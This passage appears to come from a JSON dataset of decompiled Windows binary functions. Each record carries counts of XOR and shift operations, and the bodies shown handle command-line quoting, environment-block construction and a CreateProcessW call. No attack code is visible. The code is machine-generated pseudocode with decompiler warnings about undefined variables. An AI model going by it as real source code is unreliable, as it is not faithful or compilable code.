)\n  {\n    if ( (_WORD)v279 )\n      goto LABEL_518;\n    if ( v277 == \"Windows file names may not contain `\\\"` or end with `\\\\`\" )\n      goto LABEL_522;\n    v276 = *(unsigned __int8 *)v277;\n    LOWORD(v279) = (unsigned __int8)v276;\n    if ( (v276 & 0x80u) == 0i64 )\n    {\n      ++v277;\n      goto LABEL_518;\n    }\n    v280 = v276 & 0x1F;\n    v281 = v277[1] & 0x3F;\n    if ( (unsigned __int8)v276 <= 0xDFu )\n    {\n      v277 += 2;\n      LOWORD(v279) = v281 | ((_WORD)v280 << 6);\n      goto LABEL_518;\n    }\n    v282 = (v281 << 6) | v277[2] & 0x3F;\n    if ( (unsigned __int8)v276 < 0xF0u )\n    {\n      v277 += 3;\n      v279 = (v280 << 12) | v282;\nLABEL_516:\n      if ( v279 > 0xFFFF )\n      {\n        v283 = v279 & 0x3FF | 0xDC00;\n        LOWORD(v279) = ((v279 + 16711680) >> 10) | 0xD800;\nLABEL_519:\n        if ( v278 == *(_QWORD *)&lpString1[8] )\n        {\n          sub_14005ED50((__int64)lpString1, v278, (&unk_14006C2CF - (_UNKNOWN *)v277 + 17) / 3ui64 - (v283 == 0) + 2);\n          v275 = *(char **)lpString1;\n        }\n        *(_WORD *)&v275[2 * v278++] = v279;\n        *(_QWORD *)&lpString1[16] = v278;\n        LOWORD(v279) = v283;\n        continue;\n      }\nLABEL_518:\n      v283 = 0;\n      goto LABEL_519;\n    }\n    break;\n  }\n  v279 = ((v276 & 7) << 18) | (v282 << 6) | v277[3] & 0x3F;\n  if ( v279 != 1114112 )\n  {\n    v277 += 4;\n    goto LABEL_516;\n  }\nLABEL_522:\n  v285 = *(_QWORD *)&lpString1[16];\n  *(_QWORD *)&v354[1] = *(_QWORD *)&lpString1[16];\n  v354[0] = _mm_loadu_si128((const __m128i *)lpString1);\n  if ( *(_QWORD *)&lpString1[16] == *((_QWORD *)&v354[0] + 1) )\n  {\n    sub_14002E200((__int64)v354, *(__int64 *)&lpString1[16], v276);\n    v286 = (unsigned __int64)v347;\n    v285 = *(_QWORD *)&v354[1];\n  }\n  else\n  {\n    v286 = (unsigned __int64)v347;\n  }\n  v287 = *(_QWORD *)&v354[0];\n  *(_WORD *)(*(_QWORD *)&v354[0] + 2 * v285) = 34;\n  v288 = v285 + 1;\n  *(_QWORD *)&v354[1] = v288;\n  v289 = 0i64;\n  v290 = (char **)&off_14006C318;\n  while ( v286 != v289 )\n  {\n    v89 = penv[v289++] == 34;\n    if ( v89 )\n      goto LABEL_548;\n  }\n  v291 = penv[v286 - 1];\n  if ( v291 == 92 )\n  {\nLABEL_548:\n    if ( *((_QWORD *)&v354[0] + 1) )\n      sub_1400015D0(*(void **)&v354[0], 2ui64);\n    v304 = (__int64)v351;\n    *(_QWORD *)v351 = v290;\n    *(_QWORD *)(v304 + 16) = 2i64;\n    if ( v352 )\n      sub_1400015D0((void *)lpApplicationName, 2ui64);\n    goto LABEL_336;\n  }\n  v292 = v286 - 1;\n  v293 = 0i64;\n  if ( !v291 )\n    v293 = (const __m128i *)penv;\n  if ( !v293 )\n  {\n    v292 = v286;\n    v293 = (const __m128i *)penv;\n  }\n  v294 = *((_QWORD *)&v354[0] + 1);\n  if ( *((_QWORD *)&v354[0] + 1) - v288 < v292 )\n  {\n    sub_14005ED50((__int64)v354, v288, v292);\n    v288 = *(_QWORD *)&v354[1];\n    v294 = *((_QWORD *)&v354[0] + 1);\n    v287 = *(_QWORD *)&v354[0];\n  }\n  sub_14005D0A0((__m128i *)(v287 + 2 * v288), v293, 2 * v292);\n  v296 = v292 + v288;\n  *(_QWORD *)&v354[1] = v296;\n  if ( v296 == v294 )\n  {\n    sub_14002E200((__int64)v354, v294, v162);\n    v287 = *(_QWORD *)&v354[0];\n    v296 = *(_QWORD *)&v354[1];\n  }\n  *(_WORD *)(v287 + 2 * v296) = 34;\n  *(_QWORD *)&v354[1] = v296 + 1;\n  v297 = &v274[5 * v338];\n  while ( v274 != v297 )\n  {\n    v298 = *(_QWORD *)&v354[1];\n    if ( *(_QWORD *)&v354[1] == *((_QWORD *)&v354[0] + 1) )\n    {\n      sub_14002E200((__int64)v354, *(__int64 *)&v354[1], v162);\n      v298 = *(_QWORD *)&v354[1];\n    }\n    *(_WORD *)(*(_QWORD *)&v354[0] + 2 * v298) = 32;\n    *(_QWORD *)&v354[1] = v298 + 1;\n    v299 = (unsigned __int8)v356;\n    if ( !(_BYTE)v346 )\n    {\n      v299 = (unsigned __int8)v356;\n      if ( !*v274 )\n      {\n        v300 = v274[1];\n        v301 = v274[3];\n        v302 = 0i64;\n        do\n        {\n          v299 = v301 != v302;\n          if ( v301 == v302 )\n            break;\n          v303 = sub_140005AE0(*(_BYTE *)(v300 + v302++), (__int64)\"\\t &()[]{}^=;!'+,`~%|<>\", 0x16ui64);\n        }\n        while ( v303 != 1 );\n      }\n    }\n    v290 = sub_1400412F0((__int64 *)v354, v274, v299);\n    v274 += 5;\n    if ( v290 )\n      goto LABEL_548;\n  }\n  v314 = *(_QWORD *)&v354[1];\n  if ( *(_QWORD *)&v354[1] == *((_QWORD *)&v354[0] + 1) )\n  {\n    sub_14002E200((__int64)v354, *(__int64 *)&v354[1], v162);\n    v314 = *(_QWORD *)&v354[1];\n  }\n  v167 = *(WCHAR **)&v354[0];\n  *(_WORD *)(*(_QWORD *)&v354[0] + 2 * v314) = 34;\n  v168 = v314 + 1;\n  v166 = (char **)*((_QWORD *)&v354[0] + 1);\n  LOBYTE(v295) = 1;\n  LODWORD(v338) = v295;\n  LODWORD(v4) = 0;\nLABEL_327:\n  lpCommandLine = v167;\n  v335 = v166;\n  v336 = v168;\n  if ( (char **)v168 == v166 )\n  {\n    v363 = 1;\n    sub_14002E200((__int64)&lpCommandLine, v168, v162);\n    v167 = lpCommandLine;\n    v168 = v336;\n  }\n  v167[v168] = 0;\n  v336 = v168 + 1;\n  v169 = 1544;\n  if ( !*(_BYTE *)(v348 + 196) )\n    v169 = 1024;\n  dwCreationFlags = *(_DWORD *)(v348 + 192) | v169;\n  if ( v330 )\n  {\n    LODWORD(v356) = v4;\n    v171 = v331;\n    v172 = v332;\n    v328 = v331;\n    v329 = v332;\n    *(_QWORD *)v355 = 2i64;\n    *(_OWORD *)&v355[8] = 0i64;\n    if ( v332 )\n    {\n      v173 = 2i64;\n      v174 = 0i64;\n    }\n    else\n    {\n      v365 = 1;\n      sub_14002E200((__int64)v355, 0i64, v162);\n      v173 = *(_QWORD *)v355;\n      v190 = *(_QWORD *)&v355[16];\n      *(_WORD *)(*(_QWORD *)v355 + 2i64 * *(_QWORD *)&v355[16]) = 0;\n      v174 = v190 + 1;\n      *(_QWORD *)&v355[16] = v174;\n    }\n    if ( !v171.m128i_i64[0] )\n      v172 = 0i64;\n    *(_QWORD *)lpString1 = v171.m128i_i64[0] != 0;\n    *(_QWORD *)&lpString1[8] = 0i64;\n    *(__m128i *)&lpString1[16] = v171;\n    *(_OWORD *)&lpString1[32] = v171.m128i_i64[0] != 0;\n    *(__m128i *)&lpString1[48] = v171;\n    *(_QWORD *)&v322 = v172;\n    v191 = lpString1;\n    while ( 2 )\n    {\n      v192 = v191;\n      sub_14003A4C0(&v349, v191);\n      if ( v349.m128i_i64[0] )\n      {\n        v346 = *(__m128i **)(v349.m128i_i64[0] + 56i64 * *(_QWORD *)cchCount1 + 360);\n        v347 = *(void **)(v349.m128i_i64[0] + 56i64 * *(_QWORD *)cchCount1 + 368);\n        v193 = *(_QWORD *)(v349.m128i_i64[0] + 56i64 * *(_QWORD *)cchCount1 + 376);\n        v194 = *(char **)(v349.m128i_i64[0] + 56i64 * *(_QWORD *)cchCount1 + 384);\n        v195 = *(_QWORD *)(v349.m128i_i64[0] + 56i64 * *(_QWORD *)cchCount1 + 392);\n        v196 = *(_QWORD *)(v349.m128i_i64[0] + 56i64 * *(_QWORD *)cchCount1 + 400);\n        v197 = *(_BYTE *)(v349.m128i_i64[0] + 56i64 * *(_QWORD *)cchCount1 + 408);\n        *(_DWORD *)((char *)v354 + 3) = *(_DWORD *)(v349.m128i_i64[0] + 56i64 * *(_QWORD *)cchCount1 + 412);\n        LODWORD(v354[0]) = *(_DWORD *)(v349.m128i_i64[0] + 56i64 * *(_QWORD *)cchCount1 + 409);\n        v198 = *(_OWORD *)(v349.m128i_i64[0] + 32i64 * *(_QWORD *)cchCount1);\n        *(_OWORD *)((char *)&v354[1] + 7) = *(_OWORD *)(v349.m128i_i64[0] + 32i64 * *(_QWORD *)cchCount1 + 16);\n        *(_OWORD *)((char *)v354 + 7) = v198;\n        *(_QWORD *)&v343[31] = *(_QWORD *)((char *)&v354[1] + 15);\n        *(__m128i *)&v343[16] = _mm_loadu_si128((const __m128i *)&v354[1]);\n        *(_DWORD *)v343 = v354[0];\n        *(_WORD *)&v343[4] = WORD2(v354[0]);\n        v343[6] = BYTE6(v354[0]);\n        *(_QWORD *)&v343[7] = v198;\n        v343[15] = BYTE8(v198);\n        if ( v197 != 2 )\n        {\n          v199 = _mm_loadu_si128((const __m128i *)&v343[7]);\n          *(_OWORD *)cchCount1 = *(_OWORD *)&v343[23];\n          v349 = v199;\n          v200 = (unsigned __int8 *)&v194[v196];\n          v201 = 0;\n          v202 = v194;\n          while ( 1 )\n          {\n            v203 = 1;\n            if ( v201 )\n            {\n              v201 = 0;\n              goto LABEL_375;\n            }\n            if ( v202 == (char *)v200 )\n              break;\n            LOWORD(v204) = (unsigned __int8)*v202;\n            if ( *v202 < 0 )\n            {\n              v205 = v204 & 0x1F;\n              v206 = v202[1] & 0x3F;\n              if ( (unsigned __int8)v204 <= 0xDFu )\n              {\n                v202 += 2;\n                LOWORD(v204) = v206 | ((_WORD)v205 << 6);\n              }\n              else\n              {\n                v207 = (v206 << 6) | v202[2] & 0x3F;\n                if ( (unsigned __int8)*v202 < 0xF0u )\n                {\n                  v202 += 3;\n                  v204 = (v205 << 12) | v207;\n                  if ( v204 > 0xFFFF )\n                  {\nLABEL_387:\n                    v201 = v204 & 0x3FF | 0xDC00;\n                    goto LABEL_375;\n                  }\n                }\n                else\n                {\n                  v208 = v202[3];\n                  v202 += 4;\n                  v204 = ((v205 & 7) << 18) | (v207 << 6) | v208 & 0x3F;\n                  if ( v204 > 0xFFFF )\n                    goto LABEL_387;\n                }\n              }\n            }\n            else\n            {\n              ++v202;\n            }\n            v201 = 0;\n            v203 = v204;\nLABEL_375:\n            if ( !v203 )\n            {\n              if ( v195 )\n                sub_1400015D0(v194, 1ui64);\n              v223 = v346;\n              if ( v349.m128i_i64[1] )\n                sub_1400015D0((void *)v349.m128i_i64[0], 1ui64);\n              v173 = (__int64)&off_14006C798;\n              if ( v347 )\n              {\n                v224 = 2i64;\n                v225 = (__m128i *)v223;\nLABEL_441:\n                sub_1400015D0(v225, v224);\n              }\nLABEL_442:\n              v365 = 0;\n              sub_140041780(lpString1);\n              if ( *(_QWORD *)&v355[8] )\n                sub_1400015D0(*(void **)v355, 2ui64);\n              goto LABEL_444;\n            }\n          }\n          if ( v195 )\n            sub_1400015D0(v194, 1ui64);\n          if ( *(_QWORD *)&v355[8] - v174 < v193 )\n          {\n            sub_14005ED50((__int64)v355, v174, v193);\n            v173 = *(_QWORD *)v355;\n            v174 = *(_QWORD *)&v355[16];\n          }\n          v209 = v346;\n          sub_14005D0A0((__m128i *)(v173 + 2 * v174), v346, 2 * v193);\n          v211 = v193 + v174;\n          *(_QWORD *)&v355[16] = v211;\n          if ( v347 )\n            sub_1400015D0(v209, 2ui64);\n          if ( v211 == *(_QWORD *)&v355[8] )\n          {\n            v362 = 1;\n            sub_14002E200((__int64)v355, v211, v210);\n            v173 = *(_QWORD *)v355;\n            v211 = *(_QWORD *)&v355[16];\n          }\n          *(_WORD *)(v173 + 2 * v211) = 61;\n          *(_QWORD *)&v355[16] = v211 + 1;\n          v212 = v349;\n          v213 = 0;\n          v214 = (char *)v349.m128i_i64[0];\nLABEL_399:\n          v215 = 1;\n          if ( v213 )\n          {\n            v213 = 0;\n            goto LABEL_398;\n          }\n          if ( v214 == (char *)(v349.m128i_i64[0] + *(_QWORD *)cchCount1) )\n          {\n            if ( LOBYTE(cchCount1[2]) == 2 )\n            {\n              v173 = v349.m128i_i64[0];\n              goto LABEL_442;\n            }\n            HIDWORD(v354[1]) = cchCount1[3];\n            *(_DWORD *)((char *)&v354[1] + 9) = *(int *)((char *)&cchCount1[2] + 1);\n            v354[0] = v349;\n            *(_QWORD *)&v354[1] = *(_QWORD *)cchCount1;\n            BYTE8(v354[1]) = cchCount1[2];\n            ProcessInformation.hProcess = (HANDLE)v349.m128i_i64[0];\n            ProcessInformation.hThread = (HANDLE)(v349.m128i_i64[0] + *(_QWORD *)cchCount1);\n            LOWORD(ProcessInformation.dwProcessId) = 0;\n            sub_14002E060(v355, (char **)&ProcessInformation);\n            if ( v212.m128i_i64[1] )\n              sub_1400015D0((void *)v212.m128i_i64[0], 1ui64);\n            v222 = *(_QWORD *)&v355[16];\n            if ( *(_QWORD *)&v355[16] == *(_QWORD *)&v355[8] )\n            {\n              v362 = 0;\n              sub_14002E200((__int64)v355, *(__int64 *)&v355[16], v221);\n              v222 = *(_QWORD *)&v355[16];\n            }\n            v191 = v192;\n            v173 = *(_QWORD *)v355;\n            *(_WORD *)(*(_QWORD *)v355 + 2 * v222) = 0;\n            v174 = v222 + 1;\n            *(_QWORD *)&v355[16] = v174;\n            continue;\n          }\n          LOWORD(v216) = (unsigned __int8)*v214;\n          if ( *v214 >= 0 )\n          {\n            ++v214;\n            goto LABEL_410;\n          }\n          v217 = v216 & 0x1F;\n          v218 = v214[1] & 0x3F;\n          if ( (unsigned __int8)v216 <= 0xDFu )\n          {\n            v214 += 2;\n            LOWORD(v216) = v218 | ((_WORD)v217 << 6);\n          }\n          else\n          {\n            v219 = (v218 << 6) | v214[2] & 0x3F;\n            if ( (unsigned __int8)*v214 < 0xF0u )\n            {\n              v214 += 3;\n              v216 = (v217 << 12) | v219;\n            }\n            else\n            {\n              v220 = v214[3];\n              v214 += 4;\n              v216 = ((v217 & 7) << 18) | (v219 << 6) | v220 & 0x3F;\n            }\n            if ( v216 > 0xFFFF )\n            {\n              v213 = v216 & 0x3FF | 0xDC00;\n              goto LABEL_398;\n            }\n          }\nLABEL_410:\n          v213 = 0;\n          v215 = v216;\nLABEL_398:\n          if ( !v215 )\n          {\n            v173 = (__int64)&off_14006C798;\n            if ( !v349.m128i_i64[1] )\n              goto LABEL_442;\n            v224 = 1i64;\n            v225 = (__m128i *)v349.m128i_i64[0];\n            goto LABEL_441;\n          }\n          goto LABEL_399;\n        }\n      }\n      break;\n    }\n    v365 = 0;\n    sub_140041780(lpString1);\n    if ( v174 == *(_QWORD *)&v355[8] )\n    {\n      v365 = 0;\n      sub_14002E200((__int64)v355, v174, v255);\n      v173 = *(_QWORD *)v355;\n      v174 = *(_QWORD *)&v355[16];\n    }\n    *(_WORD *)(v173 + 2 * v174) = 0;\n    v178 = *(_QWORD *)v355;\n    v177 = v348;\n    if ( !*(_QWORD *)v355 )\n    {\nLABEL_444:\n      LOBYTE(v4) = (_BYTE)v356;\n      v238 = (__int64)v351;\n      *(_QWORD *)v351 = v173;\n      *(_QWORD *)(v238 + 16) = 2i64;\n      goto LABEL_599;\n    }\n    v346 = *(__m128i **)&v355[8];\n    LODWORD(v4) = (_DWORD)v356;\n  }\n  else\n  {\n    v177 = v348;\n    v178 = 2i64;\n    v346 = 0i64;\n    v173 = 0i64;\n  }\n  v89 = *(_BYTE *)(v177 + 136) == 2;\n  v347 = (void *)v178;\n  if ( v89 )\n  {\n    lpCurrentDirectory = 0i64;\n    v340 = 2i64;\n    v339 = 0i64;\n    goto LABEL_448;\n  }\n  v226 = v177;\n  v227 = *(char **)(v177 + 112);\n  v228 = &v227[*(_QWORD *)(v226 + 128)];\n  v229 = 0;\n  v230 = v227;\n  while ( 2 )\n  {\n    v231 = 1;\n    if ( v229 )\n    {\n      v229 = 0;\n      goto LABEL_425;\n    }\n    if ( v230 != v228 )\n    {\n      LOWORD(v232) = (unsigned __int8)*v230;\n      if ( *v230 >= 0 )\n      {\n        ++v230;\n        goto LABEL_437;\n      }\n      v233 = v232 & 0x1F;\n      v234 = v230[1] & 0x3F;\n      if ( (unsigned __int8)v232 <= 0xDFu )\n      {\n        v230 += 2;\n        LOWORD(v232) = v234 | ((_WORD)v233 << 6);\n      }\n      else\n      {\n        v235 = (v234 << 6) | v230[2] & 0x3F;\n        if ( (unsigned __int8)*v230 < 0xF0u )\n        {\n          v230 += 3;\n          v232 = (v233 << 12) | v235;\n        }\n        else\n        {\n          v236 = v230[3];\n          v230 += 4;\n          v232 = ((v233 & 7) << 18) | (v235 << 6) | v236 & 0x3F;\n        }\n        if ( v232 > 0xFFFF )\n        {\n          v229 = v232 & 0x3FF | 0xDC00;\n          goto LABEL_425;\n        }\n      }\nLABEL_437:\n      v229 = 0;\n      v231 = v232;\nLABEL_425:\n      if ( !v231 )\n      {\n        v237 = (__int64)v351;\n        *(_QWORD *)v351 = &off_14006C798;\n        *(_QWORD *)(v237 + 16) = 2i64;\n        goto LABEL_597;\n      }\n      continue;\n    }\n    break;\n  }\n  *(_QWORD *)lpString1 = v227;\n  *(_QWORD *)&lpString1[8] = v228;\n  *(_WORD *)&lpString1[16] = 0;\n  sub_14003F040((__int64)v354, (char **)lpString1);\n  v240 = *((_QWORD *)&v354[0] + 1);\n  v241 = *(_QWORD *)&v354[1];\n  if ( *(_QWORD *)&v354[1] == *((_QWORD *)&v354[0] + 1) )\n  {\n    sub_14002E200((__int64)v354, *(__int64 *)&v354[1], v239);\n    v240 = *((_QWORD *)&v354[0] + 1);\n    v241 = *(_QWORD *)&v354[1];\n  }\n  v339 = v240;\n  lpCurrentDirectory = *(const WCHAR **)&v354[0];\n  *(_WORD *)(*(_QWORD *)&v354[0] + 2 * v241) = 0;\n  v340 = (__int64)lpCurrentDirectory;\nLABEL_448:\n  memset(&ProcessInformation, 0, sizeof(ProcessInformation));\n  AcquireSRWLockExclusive(&stru_140087C38);\n  LODWORD(v356) = v4;\n  if ( 2 * qword_140087CB8 )\n    v242 = !sub_14005EED0();\n  else\n    v242 = 0;\n  v349.m128i_i64[1] = (__int64)&stru_140087C38;\n  LOBYTE(cchCount1[0]) = v242;\n  v349.m128i_i64[0] = byte_140087C40 != 0;\n  *(_QWORD *)v343 = 0i64;\n  *(_QWORD *)&v343[16] = 0i64;\n  *(_QWORD *)&v343[32] = 0i64;\n  v328.m128i_i32[0] = 2;\n  v243 = &v328;\n  if ( *(_DWORD *)v348 != 6 )\n    v243 = (__m128i *)v348;\n  v244 = (struct _PROC_THREAD_ATTRIBUTE_LIST *)(v348 + 16);\n  if ( *(_DWORD *)(v348 + 16) == 6 )\n    v244 = v337;\n  v245 = v348 + 32;\n  if ( *(_DWORD *)(v348 + 32) == 6 )\n    v245 = (__int64)v337;\n  v246 = sub_140041830((__int64)v243, 0xFFFFFFF6, (__int64)v343);\n  v342 = v247;\n  if ( !v246 )\n  {\n    if ( sub_140041830((__int64)v244, 0xFFFFFFF5, (__int64)&v343[16]) )\n    {\n      v250 = (__int64)v351;\n      *(_QWORD *)v351 = v249;\n      *(_QWORD *)(v250 + 16) = 2i64;\nLABEL_586:\n      CloseHandle(v342);\n      goto LABEL_587;\n    }\n    v341 = v249;\n    if ( sub_140041830(v245, 0xFFFFFFF4, (__int64)&v343[32]) )\n    {\n      v259 = (__int64)v351;\n      *(_QWORD *)v351 = v258;\n      *(_QWORD *)(v259 + 16) = 2i64;\nLABEL_585:\n      CloseHandle(v341);\n      goto LABEL_586;\n    }\n    memset((char *)v354 + 8, 0, 60);\n    memset((char *)&v354[4] + 8, 0, 32);\n    if ( v258 || v341 || v342 )\n    {\n      HIDWORD(v354[3]) = 256;\n      *(_QWORD *)&v354[5] = v342;\n      *((_QWORD *)&v354[5] + 1) = v341;\n      *(_QWORD *)&v354[6] = v258;\n    }\n    hObject = v258;\n    v305 = *(_QWORD *)(v348 + 184);\n    if ( v305 )\n    {\n      LODWORD(v354[0]) = 112;\n      sub_1400422C0((LPPROC_THREAD_ATTRIBUTE_LIST *)v355, (__int64 **)(v348 + 168));\n      v244 = *(struct _PROC_THREAD_ATTRIBUTE_LIST **)v355;\n      if ( !*(_QWORD *)v355 )\n      {\n        v317 = (__int64)v351;\n        *(_QWORD *)v351 = *(_QWORD *)&v355[8];\n        *(_QWORD *)(v317 + 16) = 2i64;\nLABEL_584:\n        CloseHandle(hObject);\n        goto LABEL_585;\n      }\n      v348 = *(_QWORD *)&v355[8];\n      dwCreationFlags |= 0x80000u;\n      v324 = *(_QWORD *)&v354[6];\n      v323 = v354[5];\n      v322 = v354[4];\n      v306 = _mm_loadu_si128((const __m128i *)v354);\n      *(_OWORD *)&lpString1[48] = v354[3];\n      *(_OWORD *)&lpString1[32] = v354[2];\n      *(_OWORD *)&lpString1[16] = v354[1];\n      *(__m128i *)lpString1 = v306;\n      v325 = *(_QWORD *)v355;\n      lpStartupInfo = (struct _STARTUPINFOW *)lpString1;\n    }\n    else\n    {\n      LODWORD(v354[0]) = 104;\n      lpStartupInfo = (struct _STARTUPINFOW *)v354;\n    }\n    lpEnvironment = (void *)v173;\n    v309 = lpCommandLine;\n    if ( CreateProcessW(\n           lpApplicationName,\n           lpCommandLine,\n           0i64,\n           0i64,\n           1,\n           dwCreationFlags,\n           lpEnvironment,\n           lpCurrentDirectory,\n           lpStartupInfo,\n           &ProcessInformation) )\n    {\n      v310 = *(_OWORD *)v343;\n      v311 = *(_OWORD *)&v343[16];\n      v312 = v351;\n      v351[3] = *(_OWORD *)&v343[32];\n      v312[2] = v311;\n      v312[1] = v310;\n      *v312 = *(_OWORD *)&ProcessInformation.hProcess;\n      if ( v305 )\n        sub_140042740(v244, v348);\n      CloseHandle(hObject);\n      CloseHandle(v341);\n      CloseHandle(v342);\n      sub_140042270((__int64)&v349);\n      v313 = (unsigned __int8)v356;\n      if ( v339 )\n        sub_1400015D0((void *)v340, 2ui64);\n      v97 = (__int64)v337;\n      if ( v346 )\n        sub_1400015D0(v347, 2ui64);\n      if ( v335 )\n        sub_1400015D0(v309, 2ui64);\n      if ( v352 )\n        sub_1400015D0((void *)lpApplicationName, 2ui64);\n      if ( ((hProcess == 0) | v313) != 1 )\n        sub_1400015D0(penv, 2ui64);\n      goto LABEL_151;\n    }\n    LODWORD(v315) = GetLastError();\n    v316 = (__int64)v351;\n    *(_QWORD *)v351 = (v315 << 32) | 2;\n    *(_QWORD *)(v316 + 16) = 2i64;\n    if ( v305 )\n      sub_140042740(v244, v348);\n    goto LABEL_584;\n  }\n  v248 = (__int64)v351;\n  *(_QWORD *)v351 = v342;\n  *(_QWORD *)(v248 + 16) = 2i64;\nLABEL_587:\n  if ( *(_QWORD *)v343 )\n    CloseHandle(*(HANDLE *)&v343[8]);\n  if ( *(_QWORD *)&v343[16] )\n    CloseHandle(*(HANDLE *)&v343[24]);\n  if ( *(_QWORD *)&v343[32] )\n    CloseHandle(*(HANDLE *)&v343[40]);\n  LOBYTE(v4) = (_BYTE)v356;\n  if ( !v242 && 2 * qword_140087CB8 && !sub_14005EED0() )\n    byte_140087C40 = 1;\n  ReleaseSRWLockExclusive(&stru_140087C38);\n  if ( v339 )\n    sub_1400015D0((void *)v340, 2ui64);\nLABEL_597:\n  if ( v346 )\n    sub_1400015D0(v347, 2ui64);\nLABEL_599:\n  if ( v335 )\n    sub_1400015D0(lpCommandLine, 2ui64);\n  if ( v352 )\n    sub_1400015D0((void *)lpApplicationName, 2ui64);\n  v176 = 1;\n  if ( !(_BYTE)v4 )\n  {\nLABEL_337:\n    if ( hProcess )\n      sub_1400015D0(penv, 2ui64);\n    if ( v176 )\n      goto LABEL_150;\nLABEL_132:\n    if ( v330 )\n    {\n      if ( v331.m128i_i64[0] )\n      {\n        v92 = v332;\n        *(_QWORD *)&lpString1[8] = 0i64;\n        *(__m128i *)&lpString1[16] = v331;\n        *(_QWORD *)&lpString1[40] = 0i64;\n        *(__m128i *)&lpString1[48] = v331;\n        v93 = 1i64;\n      }\n      else\n      {\n        v93 = 0i64;\n        v92 = 0i64;\n      }\n      *(_QWORD *)lpString1 = v93;\n      *(_QWORD *)&lpString1[32] = v93;\n      *(_QWORD *)&v322 = v92;\n      sub_140041780(lpString1);\n    }\n  }\nLABEL_150:\n  v97 = (__int64)v337;\nLABEL_151:\n  if ( *(_DWORD *)v97 >= 4u )\n    CloseHandle(*(HANDLE *)(v97 + 8));\n}\n// 14003BD40: control flows out of bounds to 14003BD47\n// 14003B91B: variable 'v112' is possibly undefined\n// 14003B9F7: variable 'v3' is possibly undefined\n// 14003BA9A: variable 'v122' is possibly undefined\n// 14003BE39: variable 'v138' is possibly undefined\n// 14003C088: variable 'v152' is possibly undefined\n// 14003C423: variable 'v162' is possibly undefined\n// 14003C59D: variable 'v4' is possibly undefined\n// 14003CB2C: variable 'v210' is possibly undefined\n// 14003CCDE: variable 'v221' is possibly undefined\n// 14003CEFD: variable 'v239' is possibly undefined\n// 14003D004: variable 'v247' is possibly undefined\n// 14003D052: variable 'v249' is possibly undefined\n// 14003D0CA: variable 'v255' is possibly undefined\n// 14003D11A: variable 'v256' is possibly undefined\n// 14003D152: variable 'v258' is possibly undefined\n// 14003D56B: variable 'v276' is possibly undefined\n// 14003DAD3: variable 'v295' is possibly undefined\n// 14003DAE6: variable 'v315' is possibly undefined\n// 14003DC66: variable 'v318' is possibly undefined\n// 14003DE25: variable 'v319' is possibly undefined\n// 140069C90: using guessed type void *off_140069C90;\n// 140069D20: using guessed type char *off_140069D20;\n// 14006A440: using guessed type void *off_14006A440;\n// 14006A778: using guessed type void *off_14006A778;\n// 14006C318: using guessed type void *off_14006C318;\n// 14006C4E8: using guessed type char *off_14006C4E8;\n// 14006C500: using guessed type char *off_14006C500;\n// 14006C518: using guessed type char *off_14006C518;\n// 14006C558: using guessed type char *off_14006C558;\n// 14006C568: using guessed type char *off_14006C568;\n// 14006C728: using guessed type char *off_14006C728;\n// 14006C760: using guessed type char *off_14006C760;\n// 14006C798: using guessed type char *off_14006C798;\n// 14006C7C8: using guessed type void *off_14006C7C8;\n// 14006C800: using guessed type char *off_14006C800;\n// 14006CDD0: using guessed type char *off_14006CDD0;\n// 14006CDE8: using guessed type char *off_14006CDE8;\n// 140087C40: using guessed type char byte_140087C40;\n// 140087CB8: using guessed type __int64 qword_140087CB8;\n\n"
    },
    {
        "Function": "sub_140027F9B",
        "Total XOR and shift operations": 17,
        "XOR operations": 0,
        "Shift operations": 17,
        "Operation percentage": "1.43%",
        "Function Body": "\nint __fastcall sub_140027F9B(__int64 a1, _QWORD *a2)\n{\n  __int64 v2; // rbp\n  __int64 v4; // r14\n  void *v5; // r13\n  size_t v6; // r12\n  __int64 v7; // rax\n  __int64 v8; // rdx\n  __int64 v9; // rsi\n  __int64 v10; // rdi\n  const void *v11; // r8\n  size_t v12; // r9\n  __int64 v13; // rax\n  __int64 v14; // rdx\n  __int64 v15; // rsi\n  __int64 v16; // rdi\n  const void *v17; // r8\n  size_t v18; // r9\n  __int64 v19; // rdi\n  __int64 v20; // r8\n  char v21; // dl\n  char v22; // r15\n  _QWORD *v23; // rbx\n  unsigned __int64 v24; // rsi\n  __int64 v25; // rcx\n  __int64 v26; // rdx\n  unsigned int v27; // ebp\n  unsigned __int64 v28; // rsi\n  unsigned __int64 v29; // r15\n  unsigned int v30; // r14d\n  unsigned __int64 v31; // rbx\n  unsigned int v32; // r11d\n  unsigned __int64 v33; // r8\n  unsigned __int64 v34; // r15\n  int v35; // edi\n  unsigned __int64 v36; // rax\n  unsigned __int8 v37; // r15\n  char v38; // bl\n  unsigned __int64 v39; // rbp\n  bool v40; // sf\n  unsigned int v41; // edx\n  __int64 v42; // rdx\n  __int64 v43; // rax\n  int v44; // esi\n  __int64 v45; // rbx\n  int v46; // edi\n  int v47; // ebp\n  __int64 v48; // rdx\n  __int64 v49; // rdx\n  unsigned int v50; // ebp\n  int v51; // esi\n  __int64 v52; // r15\n  int v53; // edi\n  int v54; // ebx\n  __int64 v55; // rdx\n  __int64 v56; // rdx\n  char v57; // al\n  unsigned __int8 v58; // dl\n  unsigned __int8 v59; // r14\n  unsigned __int8 v60; // r15\n  __int64 v61; // rax\n  __m128i *v62; // rbx\n  __int64 v63; // rbx\n  __int64 v64; // rbx\n  __int64 v65; // r15\n  __int64 v66; // r15\n  unsigned __int8 v67; // al\n  unsigned __int8 v68; // dl\n  unsigned __int8 v69; // si\n  __int64 v70; // r15\n  __int64 v71; // r15\n  __int64 v72; // rdi\n  __int64 v73; // r15\n  __int64 v74; // r14\n  __int64 v75; // rbx\n  __int64 v76; // r15\n  __int64 v77; // rbx\n  unsigned __int64 v78; // rax\n  __int64 v79; // r15\n  __int64 v80; // rax\n  __m128i *v81; // rbx\n  __int64 v82; // rbx\n  __int64 v83; // r15\n  __int64 v84; // rdi\n  __int64 v85; // r14\n  __int64 v86; // rbp\n  __int8 *v87; // rbx\n  __m128i *v88; // r8\n  __int64 v89; // rbx\n  __int64 v90; // r15\n  __int64 v91; // r15\n  unsigned int v92; // eax\n  __int64 v93; // rax\n  char *v94; // rcx\n  char *v95; // rbx\n  __int64 v96; // rdi\n  __int64 v97; // r15\n  unsigned int v98; // esi\n  __int64 v99; // rdi\n  __int64 v100; // rbp\n  __int64 v101; // r14\n  __int64 v102; // rax\n  __int64 v103; // rcx\n  __int64 *v104; // rdx\n  char v105; // bl\n  char *v106; // rax\n  __int64 v107; // rcx\n  __int64 (__fastcall *v108)(); // rax\n  __int128 *v109; // rdx\n  __int64 v110; // rax\n  __int64 v111; // rax\n  char **v112; // rax\n  __int64 v113; // rax\n  __int128 *v114; // rdx\n  char 